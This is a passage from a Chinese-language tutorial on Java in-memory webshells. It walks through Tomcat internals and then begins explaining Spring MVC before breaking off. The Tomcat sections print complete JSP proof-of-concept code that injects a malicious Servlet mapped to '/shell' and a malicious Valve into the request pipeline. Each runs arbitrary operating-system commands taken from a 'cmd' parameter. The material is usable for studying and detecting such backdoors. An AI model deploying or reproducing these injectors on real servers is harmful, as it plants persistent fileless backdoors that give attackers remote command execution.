            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712726438093-1869cc3e-18ad-415a-ab2e-da2598477b21.png)
下面就是实现动态注册`Servlet`了。

### 4.3.1、Servlet创建流程

我们知道`Servlet`的生命周期分为如下五部分

1. 加载：当`Tomcat`第一次访问`Servlet`的时候，`Tomcat`会负责创建`Servlet`的实例
2. 初始化：当`Servlet`被实例化后，`Tomcat`会调用`init()`方法初始化这个对象
3. 处理服务：当浏览器访问`Servlet`的时候，`Servlet` 会调用`service()`方法处理请求
4. 销毁：当`Tomcat`关闭时或者检测到`Servlet`要从`Tomcat`删除的时候会自动调用`destroy()`方法，让该实例释放掉所占的资源。一个`Servlet`如果长时间不被使用的话，也会被`Tomcat`自动销毁
5. 卸载：当`Servlet`调用完`destroy()`方法后，等待垃圾回收。如果有需要再次使用这个`Servlet`，会重新调用`init()`方法进行初始化操作

[前面](https://www.yuque.com/exmmmys/wnuua5/navlga3lr8rqlnaa)我们已经分析过，在`org.apache.catalina.core.StandardContext`类的`startInternal()`方法中，我们能看到`Listener->Filter->Servlet`的加载顺序

```java
...
 
if (ok) {
                if (!listenerStart()) {
                    log.error(sm.getString("standardContext.listenerFail"));
                    ok = false;
                }
            }
 
 
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString("standardContext.managerFail"), e);
                ok = false;
            }
 
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString("standardContext.filterFail"));
                    ok = false;
                }
            }
 
            // Load and initialize all "load on startup" servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString("standardContext.servletFail"));
                    ok = false;
                }
            }
 
 
            // Start ContainerBackgroundProcessor thread
            super.threadStart();
        }if (ok) {
                if (!listenerStart()) {
                    log.error(sm.getString("standardContext.listenerFail"));
                    ok = false;
                }
            }
 
 
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString("standardContext.managerFail"), e);
                ok = false;
            }
 
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString("standardContext.filterFail"));
                    ok = false;
                }
            }
 
            // Load and initialize all "load on startup" servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString("standardContext.servletFail"));
                    ok = false;
                }
 
            }
 
            // Start ContainerBackgroundProcessor thread
 
            super.threadStart();
 
        }
 
...
```

### 4.3.2、创建StandardWrapper

在`StandardContext#startInternal`中，调用了`fireLifecycleEvent()`方法解析`web.xml`文件，我们跟进
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712726980721-ff0178a6-966c-4b7d-a6c9-4edf0d2700db.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712726989221-d5a071fa-6f43-4a24-8f3b-694062ecacac.png)

```java
protected void fireLifecycleEvent(String type, Object data) {
    LifecycleEvent event = new LifecycleEvent(this, type, data);
    Iterator i$ = this.lifecycleListeners.iterator();

    while(i$.hasNext()) {
        LifecycleListener listener = (LifecycleListener)i$.next();
        listener.lifecycleEvent(event);
    }

}
```

最终通过`ContextConfig#webConfig()`方法解析`web.xml`获取各种配置参数
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712727249923-03639145-cc84-4bc9-8521-8443c2fb3357.png)
然后通过`configureContext(webXml)`方法创建`StandWrapper`对象，并根据解析参数初始化`StandWrapper`对象
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712727262932-c0166a12-508f-40a6-8ad0-f30ec243a421.png)

```java
 private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
 
...   //设置StandardContext参数
 
        
        for (ServletDef servlet : webxml.getServlets().values()) {
 
            //创建StandardWrapper对象
            Wrapper wrapper = context.createWrapper();
 
            if (servlet.getLoadOnStartup() != null) {
 
                //设置LoadOnStartup属性
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
 
            //设置ServletName属性
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
 
            //设置ServletClass属性
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
 
            //将包装好的StandWrapper添加进ContainerBase的children属性中
            context.addChild(wrapper);
 
           for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
          
            //添加路径映射
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
```

最后通过`addServletMappingDecoded()`方法添加`Servlet`对应的`url`映射

### 4.3.3、加载StandWrapper

接着在`StandardContext#startInternal`方法通过`findChildren()`获取`StandardWrapper`类
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712727612067-fa457ab2-5404-48cc-ab61-ec8eeef44bc4.png)
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712727623797-8f631ecd-cda6-4eb3-ad46-aa978a2d9565.png)
最后依次加载完`Listener`、`Filter`后，就通过`loadOnStartUp()`方法加载`wrapper`

```java
public boolean loadOnStartup(Container children[]) {

    // Collect "load on startup" servlets that need to be initialized
    TreeMap<Integer, ArrayList<Wrapper>> map = new TreeMap<>();
    for (Container child : children) {
        Wrapper wrapper = (Wrapper) child;
        int loadOnStartup = wrapper.getLoadOnStartup();

        //判断属性loadOnStartup的值
        if (loadOnStartup < 0) {
            continue;
        }
        Integer key = Integer.valueOf(loadOnStartup);
        ArrayList<Wrapper> list = map.get(key);
        if (list == null) {
            list = new ArrayList<>();
            map.put(key, list);
        }
        list.add(wrapper);
    }

    // Load the collected "load on startup" servlets
    for (ArrayList<Wrapper> list : map.values()) {
        for (Wrapper wrapper : list) {
            try {
                wrapper.load();
            }
```

注意这里对于`Wrapper`对象中`loadOnStartup`属性的值进行判断，只有大于`0`的才会被放入`list`进行后续的`wrapper.load()`加载调用。
这里对应的实际上就是`Tomcat Servlet`的懒加载机制，可以通过`loadOnStartup`属性值来设置每个`Servlet`的启动顺序。默认值为`-1`，此时只有当`Servlet`被调用时才加载到内存中。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712727792699-305c2a5c-653b-4191-9dbd-66a999e2459f.png)
至此`Servlet`才被加载到内存中。

### 4.3.4、动态注册Servlet

通过上文的分析我们能够总结出创建`Servlet`的流程

1. 获取`StandardContext`对象
2. 编写恶意`Servlet`
3. 通过`StandardContext.createWrapper()`创建`StandardWrapper`对象
4. 设置`StandardWrapper`对象的`loadOnStartup`属性值
5. 设置`StandardWrapper`对象的`ServletName`属性值
6. 设置`StandardWrapper`对象的`ServletClass`属性值
7. 将`StandardWrapper`对象添加进`StandardContext`对象的`children`属性中
8. 通过`StandardContext.addServletMappingDecoded()`添加对应的路径映射

### 4.3.5、获取StandardContext对象

StandardContext对象获取方式多种多样

```java
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>
```

或

```java
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
```

### 4.3.6、编写恶意的Servlet

```java
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
```

### 4.3.7、创建Wrapper对象

```java
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
```

### 4.3.8、将Wrapper添加到StandardContext

```java
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

### 4.3.9、完整POC

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>
 
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
 
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
 
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712803360359-8cb9cd11-2026-4e82-b04a-ffa3c6b262e9.png)

## 4.4、Valve型

### 4.4.1、什么是Valve

在了解`Valve`之前，我们先来简单了解一下`Tomcat`中的管道机制。
我们知道，当`Tomcat`接收到客户端请求时，首先会使用`Connector`进行解析，然后发送到`Container`进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到`Servlet`进行处理的呢？这里涉及到的机制就是`Tomcat`管道机制。
管道机制主要涉及到两个名词，`Pipeline`（管道）和`Valve`（阀门）。如果我们把请求比作管道（`Pipeline`）中流动的水，那么阀门（`Valve`）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为`Filter`中的责任链机制
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712803518764-75cdd9dc-993d-4215-ac3f-8933d0858f92.png)
在`Tomcat`中，四大组件`Engine`、`Host`、`Context`以及`Wrapper`都有其对应的`Valve`类，`StandardEngineValve`、`StandardHostValve`、`StandardContextValve`以及`StandardWrapperValve`，他们同时维护一个`StandardPipeline`实例。

### 4.4.2、管道机制流程分析

我们先来看看`Pipeline`接口，继承了`Contained`接口

```java
public interface Pipeline extends Contained {
 
    public Valve getBasic();
 
    public void setBasic(Valve valve);
 
    public void addValve(Valve valve);
 
    public Valve[] getValves();
 
    public void removeValve(Valve valve);
 
    public void findNonAsyncValves(Set<String> result);
}
```

`Pipeline`接口提供了各种对`Valve`的操作方法，如我们可以通过`addValve()`方法来添加一个`Valve`。下面我们再来看看`Valve`接口

```java
public interface Valve {
 
    public Valve getNext();
 
    public void setNext(Valve valve);
 
    public void backgroundProcess();
 
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
 
    public boolean isAsyncSupported();
}
```

其中`getNext()`方法可以用来获取下一个`Valve`，`Valve`的调用过程可以理解成类似`Filter`中的责任链模式，按顺序调用。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712803966728-b1a34c8e-1898-4e85-b058-e3682f4be429.png)
同时`Valve`可以通过重写`invoke()`方法来实现具体的业务逻辑

```java
class Shell_Valve extends ValveBase {
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            ...
            }
        }
    }
```

下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到`Connector`被解析后，在`org.apache.catalina.connector.CoyoteAdapter#service`方法中

```java
public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
    Request request = (Request) req.getNote(ADAPTER_NOTES);
        Response response = (Response) res.getNote(ADAPTER_NOTES);
 
        if (request == null) {
            // Create objects
            request = connector.createRequest();
            request.setCoyoteRequest(req);
            response = connector.createResponse();
            response.setCoyoteResponse(res);
 
            // Link objects
            request.setResponse(response);
            response.setRequest(request);
 
            // Set as notes
            req.setNote(ADAPTER_NOTES, request);
            res.setNote(ADAPTER_NOTES, response);
 
            // Set query string encoding
            req.getParameters().setQueryStringCharset(connector.getURICharset());
        }
...
 
    try {
            ...
            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
            }
...
}
```

前面是对`Request`和`Respone`对象进行一些判断及创建操作，我们重点来看一下`connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)`
首先通过`connector.getService()`来获取一个`StandardService`对象
接着通过`StandardService.getContainer().getPipeline()`获取`StandardPipeline`对象。
再通过`StandardPipeline.getFirst()`获取第一个`Valve`

```java
@Override
    public Valve getFirst() {
        if (first != null) {
            return first;
        }
 
        return basic;
    }
```

最后通过调用`StandardEngineValve.invoke()`来实现`Valve`的各种业务逻辑

```java
public final void invoke(Request request, Response response)
        throws IOException, ServletException {
 
        // Select the Host to be used for this Request
        Host host = request.getHost();
        if (host == null) {
            // HTTP 0.9 or HTTP 1.0 request without a host when no default host
            // is defined.
            // Don't overwrite an existing error
            if (!response.isError()) {
                response.sendError(404);
            }
            return;
        }
        if (request.isAsyncSupported()) {
            request.setAsyncSupported(host.getPipeline().isAsyncSupported());
        }
 
        // Ask this Host to process this request
        host.getPipeline().getFirst().invoke(request, response);
    }
```

`host.getPipeline().getFirst().invoke(request, response)`实现调用后续的`Valve`。

### 4.4.3、动态添加Valuv

根据上文的分析我们能够总结出`Valve`型内存马的注入思路

1. 获取`StandardContext`对象
2. 通过`StandardContext`对象获取`StandardPipeline`
3. 编写恶意`Valve`
4. 通过`StandardPipeline.addValve()`动态添加`Valve`

#### 4.4.3.1、获取StandardPipeline对象

```java
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
 
    Pipeline pipeline = standardContext.getPipeline();
%>
```

#### 4.4.3.2、编写恶意的`valve`类

```java
<%!
    class Shell_Valve extends ValveBase {
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%>
```

#### 4.4.3.3、将恶意`Valve`添加进`StandardPipeline`

```java
<%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%>
```

### 4.4.4、完整POC

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
 
    Pipeline pipeline = standardContext.getPipeline();
%>
 
<%!
    class Shell_Valve extends ValveBase {
 
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
    }
%>
 
<%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712805732820-f5ce1829-ace9-4114-8dfc-777a2e50bfd3.png)
任意路径即可命令执行

# 5、Spring内存马

## 5.1、什么是Spring

`Spring`是一个轻量级的`Java`开源框架，用于配置、管理和维护`Bean`（组件）的一种框架，其核心理念就是`IoC`(`Inversion of Control,控制反转`) 和 `AOP`(`AspectOrientedProgramming`， 面向切面编程)。现如今`Spring`全家桶已是一个庞大的家族
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712805847378-c73593ae-18c0-4a66-8bb6-558b1e38c30f.png)
`Spring`的出现大大简化了`JavaEE`的开发流程，减少了`Java`开发时各种繁琐的配置。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712805863120-14a7c006-b9a4-4a05-9af7-c8512ca316e0.png)
`Spring`框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712805911819-04119dc5-16bf-45d8-adf5-bb02eb47da3e.png)

### 5.1.1、SpringBoot

`SpringBoot` 基于 `Spring` 开发。不仅继承了`Spring`框架原有的优秀特性，它并不是用来替代 `Spring` 的解决方案，而和 `Spring` 框架紧密 结合进一步简化了`Spring`应用的整个搭建和开发过程。其设计目的是用来简化 `Spring` 应用的初始搭建以及开发过程。
采用 `Spring Boot `可以大大的简化开发模式，它集成了大量常用的第三方库配置，所有你想集成的常用框架，它都有对应的组件支持，例如 `Redis`、`MongoDB`、`Dubbo`、`kafka`，`ES`等等。`SpringBoot` 应用中这些第三方库几乎可以零配置地开箱即用，大部分的 `SpringBoot` 应用都只需要非常少量的配置代码，开发者能够更加专注于业务逻辑。 另外`SpringBoot`通过集成大量的框架使得依赖包的版本冲突，以及引用的不稳定性等问题得到了很好的解决。
下面我们就通过`IDEA`中的`Spring Initializr`来快速构建一个基于`SpringBoot`的`Web`项目
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712882842976-da92f954-3326-4cb6-828f-f87cfabac752.png)
选择`Spring Web`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712882887674-271a2bd6-f265-4f02-bbab-e4974631f71e.png)
创建好之后，IDEA会自动创建一个启动类
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712882958204-f6b606ee-0e3d-4f44-9f18-c2f6b309cd11.png)
下面我们就可以编写相应的`Controller`（控制器)及各种业务逻辑了

```java
package com.example.spring.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class HelloWouldController {
    @ResponseBody
    @RequestMapping(value = "hello2", method = RequestMethod.GET)
    public String Hello() {
        return "Hello Would";
    }
}

```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712883280309-edabcc72-679d-4ef3-a402-29afcd6844ac.png)

### 5.1.2、Spring MVC、Tomcat和Servlet

首先来设想这样一个场景，假如让我们自己手动实现一个简易的Web`服务`器，我们会怎么做？
首先我们肯定要接收客户端发来的`TCP`数据包，这里我们需要一个`TCPServer`来监听`80`端口。接着我们需要将`TCP`数据包解析成`HTTP`协议，获取`URL`路径、参数列表等数据信息。再然后就是执行各种逻辑处理。最后就是把处理的结果封装成`HTTP`协议返回给浏览器，并且等浏览器收到响应后断开连接。以上就是一个简易`Web`服务器的实现逻辑，当然，真正的`Web`服务器可能要比上述更加复杂一些，但核心功能是不变的：**接受请求、处理请求、返回响应。**
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712883381729-2da17003-f911-428c-a769-c5a46ec732b5.png)
当然，如果我们在处理业务时每次都要进行一遍上述流程，这未免太繁琐。其实我们可以发现在上述流程中，网络通信、`HTTP`协议解析和封装部分的实现都相对固定。有变化的部分其实只有逻辑处理器，需要我们根据不同请求包而做出相应的逻辑处理。因此，为了提高开发效率，我们能不能将不变的部分封装起来呢？这其实就是我们的`Web`服务器。
`Tomcat`就是这样一种服务器，它其实就是一个能够监听`TCP`连接请求，解析`HTTP`报文，将解析结果传给处理逻辑器、接收处理逻辑器的返回结果并通过`TCP`返回给浏览器的一个框架。在`Tomcat`各种组件中，`Connnector`就是负责网络通信的，而`Container`中的`Servlet`就是我们的逻辑处理器。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712883574927-a53243f9-74f5-43ab-8bd1-72e23878c1b8.png)
因此`Tomcat`就是一个`Servlet`容器，它将前后端交互过程中不变的东西（网络通信、协议解析等)封装了起来。而`Servlet`是一个逻辑处理器，它可以被`Tomcat`创建、调用和销毁。所以我们的`Web`程序核心是基于`Servlet`的，而`Web`程序的启动依靠`Tomcat`。
那`Spring MVC`呢？`Spring`是利用注解、反射和模板等技术实现的一种框架。其核心类是继承于`HttpServlet`的`DispatchServlet`。那既然是`Servlet`，那负责的肯定就是逻辑处理部分了，那么就需要`Tomcat`这样的服务器来给`Spring`提供运行环境。

### 5.1.3、SpringMVC

#### 5.1.3.1、Spring MVC的运行流程

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712883648051-7e156c4d-26e7-4a46-8649-fb5b41b1d654.png)
客户端发送`Request`，`DispatcherServlet`(等同于`Controller`控制器)，控制器接收到请求，来到`HandlerMapping`（在配置文件中配置），`HandlerMapping`会对`URL`进行解析，并判断当前`URL`该交给哪个`Controller`来处理，找到对应的`Controller`之后，`Controller`就跟`Server`、`JavaBean`进行交互，得到某一个值，并返回一个视图（`ModelAndView`过程)，`Dispathcher`通过`ViewResolver`视图解析器,找到`ModelAndView`对象指定的视图对象,最后，视图对象负责渲染返回给客户端。

#### 5.1.3.2、创建一个简单的Spring MVC项目

使用`Maven`来创建一个简单的`SpringMVC`项目。创建好`Maven`项目后添加相应的`Springmvc`依赖

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>Spring</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>SpringDemo</name>
    <description>SpringDemo</description>
    <properties>
        <java.version>1.8</java.version>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <spring-boot.version>2.6.13</spring-boot.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
        <dependency>
            <groupId>taglibs</groupId>
            <artifactId>standard</artifactId>
            <version>1.1.2</version>
        </dependency>
    </dependencies>
    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring-boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
        </dependencies>
    </dependencyManagement>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.8.1</version>
                <configuration>
                    <source>1.8</source>
                    <target>1.8</target>
                    <encoding>UTF-8</encoding>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <version>${spring-boot.version}</version>
                <configuration>
                    <mainClass>com.example.spring.SpringDemoApplication</mainClass>
                    <skip>true</skip>
                </configuration>
                <executions>
                    <execution>
                        <id>repackage</id>
                        <goals>
                            <goal>repackage</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project>

```

编写`web.xml`文件来配置`Servlet`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712884374810-52229d71-90c3-4b7e-b414-9ad2737ecd6b.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
 
  <display-name>Archetype Created Web Application</display-name>
 
  //使用默认的DispatcherServlet
  <servlet>
    <servlet-name>spring</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
      <param-name>contextConfigLocation</param-name>
       //spring配置文件路径
      <param-value>/WEB-INF/springmvc.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
  </servlet>
 
  <servlet-mapping>
    <servlet-name>spring</servlet-name>
    //路径设置为根目录
    <url-pattern>/</url-pattern>
  </servlet-mapping>
 
 
</web-app>
```

配置`springmvc.xml`

```java
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">

    //设置注解扫描包路径
    <context:component-scan base-package="com.controller"/>

    <!-- 开启springMVC的注解驱动，使得url可以映射到对应的controller -->
    <mvc:annotation-driven />

    <!-- 视图解析 -->
    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/views/"/>
        <property name="suffix" value=".jsp"/>
    </bean>

</beans>
```

在`com.controller`包下创建`test`控制器
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712885507118-9a0341f7-ecb8-47b2-a81f-19ae2a3b916c.png)

```java
package com.controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class Test {
    @ResponseBody
    @RequestMapping("hello")
    public String Hello() {
        System.out.println("hello");
        return "hello";
    }
}

```

配置`Tomcat`，添加相应`war`包
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712885609983-b175b6db-11a2-4d09-af76-82a38b82cae2.png)
启动`Tomcat`，访问`http://localhost/hello`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712885999291-890c1d13-cded-40cb-8e25-e60fe4810355.png)

## 5.2、Controller型内存马

### 5.2.1、Bean

`Bean` 是 `Spring` 框架的一个核心概念，它是构成应用程序的主干，并且是由 `Spring IoC` 容器负责实例化、配置、组装和管理的对象。

- `bean` 是对象
- `bean` 被 `IoC` 容器管理
- `Spring` 应用主要是由一个个的 `bean` 构成的

### 5.2.2、IOC容器

如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是`IoC`（又称为依赖注入）。由`IoC`负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。

`IOC`容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用`xml`、`Java`注解或`Java`代码来表示。

### 5.2.3、ApplicationContext

`Spring` 框架中，`BeanFactory` 接口是 `Spring IoC`容器 的实际代表者
